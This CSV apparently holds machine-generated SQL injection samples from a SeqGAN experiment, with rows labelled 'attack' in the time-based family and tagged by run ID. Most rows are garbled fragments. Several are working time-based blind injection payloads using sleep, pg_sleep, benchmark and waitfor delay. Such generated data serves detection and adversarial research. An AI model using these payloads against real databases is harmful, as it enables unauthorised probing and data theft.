label,payload,family,payload_type,method,run_id,sample_index
attack,"1 where 6767   and pg_sleep  (  __TIME__TIME__' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,720
attack,"select sleep  (  5000000,md5  (     ) pg_sleep  (  _  )    (   __TIME__Trergid",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,721
attack,   )    )    as vermyfs,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,722
attack,; if not  )   md5  (  5   )    )     )  syq  )  susrmzf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,723
attack,"1 or   (  5   )    )     )  2679  )   and   (  10000000,MD5  (  5   )    )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,724
attack,1   )    as,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,725
attack, (  select pg_sleep  (  =  sddo  (  select 8594  (  4276 rlike where vu where 4871  =  3885,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,726
attack, )    as rlv in where 7629u  =  2657 and sleep  (  __TIME__  )   mqfd5  ((  5   )    )     q  gxrlikerjf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,727
attack,"""  )   as hlike sleep  (  5000000,md5  (  fdduuno  )    (    (   'nvqf'  =  pdwfd",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,728
attack,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'wmvjf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,729
attack,"1%,waitfor delay @@vrlijlvbdbedgclwhere 7165 or sleep  (  0x694a4745   )    )   eyf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,730
attack,"1""   )    a)    asas from smyertyq  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,731
attack,"1'   )    )    or 4240 rlikl' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,732
attack,",waitfor delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,733
attack,waitfor r or pg_sleep  (  __TIME__  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,734
attack,"1%"" where 2679  2657 and sleep  (  5   )    )",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,735
attack,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eegefg""  =  ""vacharar",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,736
attack," )    )   or sleep  (  5000000,md5  (  5000000,md5  (  5000000,md5  (  5000000,md5  (  5   )    gcjar",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,737
attack,"1""   )    )     )aras where 6784 rlike sleep  (  5   )    )     )  )   and sraree   )    )    and eul from   ((  5   )    )     )  y  )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,738
attack,select pg_sleep  (  5   )    (    )   y   )    )     )  srragcjrrf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,739
attack,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  '    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,740
attack,"1%' and   (  select  =   waitfor delay '0:0:5''mmdf""  =  ""vxse'  =  'l__ensTIMeog",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,741
attack, (  select pg_sleep  (  select (  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,742
attack,select benchmark  (  __TIME__  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,743
attack,1'   )    )    or sleep  (  5  )   and    (    (   'u  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,744
attack,"1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jrj'  =  'wxig""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,745
attack, (  select pg_sleep  (  sleep  (  5   )    )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,746
attack,"'0:0:5'""  )   as x",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,747
attack,"select  =  7260   )    (   ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,748
attack,"1"" rlike sleep  (  5  )   and ""velvfrvprjf'  =  '""  =  ""emep  )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,749
attack,"""   )    )    as )   and 1547  =  4871 and 6969 from pg_sleep  (  10000000,MD5  pg_sleep  (  sleep  (  5   )    )     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,750
attack,"1   )    )   <> ""veefs",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,751
attack,1 and pg_sleep  (  5   )    )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,752
attack, (  select '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,753
attack,1'   )    )    asieybesub,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,754
attack,waitfor 'mydmy,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,755
attack,"1%""  )   or sleep  (  5   )    )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,756
attack,; if not  (  vwduduas where vefsuvvl,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,757
attack,; if not  )   yds where ge pg_sleep  (  5   )    )     )  5   )    (    q  )  )  vf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,758
attack,1'   )    )    ase_s vs where 7528  =  9443udu rlike sleep  (  5   )    )     )  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,759
attack,"1"" rlike sleep  (  5  )   and ""vlubadcn",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,760
attack,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,761
attack,"waitfor delay 8507  6969 from    (  sleep  (  5000000,md5d  (  'isintegratedsecurityonly'   )    )    aaraE__Tstdvcyb",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,762
attack,1'+  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,763
attack,select benchmark  (  9558  (  5   )    )     )  5000000  )    d;argq rlike 4240  =    (   'enpn' 6175  (  select  ;   (  select 50  =  7812 rnfd information_schema.em5000000s ),time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,764
attack,1%'   )    )    or sleep  (  5  )   rlike sleep  (  5   )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,765
attack,1%' and   (  select * from   (  5   )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,766
attack,waitfor delay 'gfpd'  =  5466sds  (  substring   ((  5   )    )     )  veed5  (  __TIME__  )     )  sdmq  (  s ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,767
attack,1 where 5466   (  select * * 4287  )   waitfor delay benchmark   (  select   )    qfryzo,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,768
attack,1   )    )    asie_s )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,769
attack,1'||  (  select 'w     )   asvfn,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,770
attack,"1%""   )    )    ase ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,771
attack,1%or igen,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,772
attack,"1"" and sleep  (  5  )   and ""rjjf'  =  'iyqovg"" like ""tmf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,773
attack,"1  )   as if delay 6793 from 4240 from pg_sleep  (  5000000,mddp rlike sleep  (  5000000,mydp  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,774
attack,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioarv'  =  'argf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,775
attack,  (  substring   (    (   select 4240 from pg_sleep  (   __TIME__TIME__  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,776
attack,1  ) ey#,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,777
attack,"select sleep  (  5000000,md5  )   6456   and   (  select   (  select 4240n  (  sleep  (  5000000,md5  (  'isintegratedsecurityonly'   (  0x4c4d6142   )    )    aserlctarre--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,778
attack,1'  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,779
attack,1'   )    )    or  7739srsevl,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,780
attack,1'   )    )    asembxvlr,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,781
attack,"select benchmark  (  5000000,md5  (  5   )    (     )   and   (  select   (    )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,782
attack,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""epfg"" like ""er""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,783
attack,"waitfor delay ' from   (    (    (   select pg_sleep  (  substringd""  =  ""  )   d5  (  5   )    )     #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,784
attack,", if not   and    (     (  5   )    )     )  )",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,785
attack,1  )   and pg_sleep  (  5  )   d sdmararar_er,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,786
attack,"1%' or   (  5000000,mddo  ) e where (  5  )   mq  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,787
attack,"""  )   asiondd",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,788
attack,"1%""   )    )    asy",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,789
attack,",waitfor delay #sleep  (  __TIME__  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,790
attack,select benchmark  (  5   )    )    (   asdrm,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,791
attack,1'   )    )     )   or sleep  (  __TIME__  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,792
attack,"1""  )   as ke where 2657 sleep  (  5   )    )     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,793
attack,1  )   where 2335  =  vwebelrmqlTIMpkaajjri where 2840  sleep5  )   and 6969  )   and like    (    (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,794
attack,"select benchmark  (  5000000,md5  (   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,795
attack,; if pg_sleep  =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,796
attack,", if 4287 or or pg_sleep  (  _Tond",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,797
attack,select benchmark  (  select   )    )     (  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,798
attack,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xand (  =  select sleepd",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,799
attack,1 or   6456  5   )    )     )  s  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,800
attack,"1%' or  5466,sleep  (  5000000,mdsr'  =  'bcjrephaharar  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,801
attack,1'  )   or pg_sleep  (  5   )    )     )  ydpu  )   and   (  select   (  __TIME__TIME__  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,802
attack,1 and   (  =  gcrv rlike sleep  (  substring   (  select    (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,803
attack,",waitfor delay '0:0:2' ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,804
attack,1  )   ;waitfor delay '0:0:10'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,805
attack,1%--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,806
attack,pg_sleep  (  5   )    )     o    )  srem)  )  ser'  =  '  )   ;waitfor delay pg_sleep  (  5   )    )     )  srmey  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,807
attack," (  select elt  (  sleep  (  5   )    )     q  srmq  )   and   (  0x694a4745   )    )     )  srmz    qy_TIME  (  __TIME__TIME__  (  select 4240  =  vw   (  if pg_sleep  (  5  )   _srmq  )   asmd5  (  5   )    )     )  ydpu   )    )     )  srverserpepropar""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,808
attack,"1'+  (  select '"" like ""engfg"" like ""tarf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,809
